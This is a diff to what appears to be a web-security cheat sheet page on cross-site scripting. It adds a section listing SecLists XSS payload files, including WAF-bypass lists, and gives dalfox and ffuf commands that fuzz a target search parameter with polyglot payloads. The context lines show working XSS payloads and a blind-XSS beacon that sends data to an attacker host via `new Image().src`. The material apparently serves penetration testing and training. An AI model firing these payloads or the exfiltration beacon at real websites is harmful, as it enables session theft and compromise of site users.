@@ -185,6 +185,28 @@ new Image().src='https://attacker.com/blind?'+
 onerror=alert;throw 1           # error event
 &lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/svg&gt;</code></pre>
 
+  <h2>SecLists XSS Payload Lists</h2>
+  <p>See <a href="/web/fuzzing-payloads/">Web Fuzzing Payloads</a> for full context and usage examples.</p>
+  <pre><code># /usr/share/seclists/Fuzzing/XSS/
+#
+# Polyglots/XSS-Polyglots.txt              14  — multi-context polyglots (start here)
+# Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt  — single comprehensive polyglot
+# human-friendly/XSS-Jhaddix.txt               — curated, real-world bypass rate
+# human-friendly/XSS-BruteLogic.txt            — minimal, high bypass rate
+# human-friendly/XSS-Cheat-Sheet-PortSwigger.txt — PortSwigger lab payloads
+# human-friendly/XSS-payloadbox.txt            — large collection, all contexts
+# human-friendly/xss-without-parentheses-semi-colons-portswigger.txt — WAF bypass
+# robot-friendly/ — URL-encoded versions of all above, for automated scanners
+
+# Quick polyglot scan with dalfox:
+dalfox url "https://target.com/search?q=XSS" \
+  --custom-payload /usr/share/seclists/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt
+
+# ffuf XSS detection:
+ffuf -u "https://target.com/search?q=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt \
+  -mr "alert|onerror|onload" -v</code></pre>
+
   <h2>Tools</h2>
   <ul>
     <li>Burp Suite DOM Invader — DOM XSS source/sink analysis</li>
@@ -192,4 +214,5 @@ onerror=alert;throw 1           # error event
     <li>dalfox — <code>github.com/hahwul/dalfox</code> — fast XSS scanner</li>
     <li>PortSwigger XSS labs — <code>portswigger.net/web-security/cross-site-scripting</code></li>
     <li>XSS cheat sheet — <code>portswigger.net/web-security/cross-site-scripting/cheat-sheet</code></li>
+    <li>SecLists XSS lists — <a href="/web/fuzzing-payloads/">Web Fuzzing Payloads</a></li>
   </ul>
